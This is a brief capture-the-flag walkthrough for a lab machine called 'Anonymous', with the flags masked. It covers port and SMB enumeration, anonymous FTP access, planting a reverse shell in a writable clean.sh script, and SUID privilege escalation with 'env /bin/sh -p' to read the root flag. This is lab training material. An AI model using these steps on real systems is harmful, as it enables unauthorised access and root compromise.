# Anonymous

- Enumerate the machine.  How many ports are open?

	- `scilla port -target <TARGET_IP>`
	- `*`

- What service is running on port 21?

	- `ftp`

- What service is running on ports 139 and 445?

	- `smb`

- There's a share on the user's computer.  What's it called?

	- `smbclient -L <TARGET_IP>`
	- `****`

- user.txt

	- Connect in anonymous mode via ftp and download everything.
	- We can write `clean.sh`, so add a reverse shell.
	- Fire up a shell and cat the flag.
	- `**********************`

- root.txt

	- `sudo -l`
	- `find / -user root -perm -u=s 2>/dev/null`
	- `/usr/bin/env`
	- `env /bin/sh -p`
	- `cat /root/root.txt`
	- `*******************************`
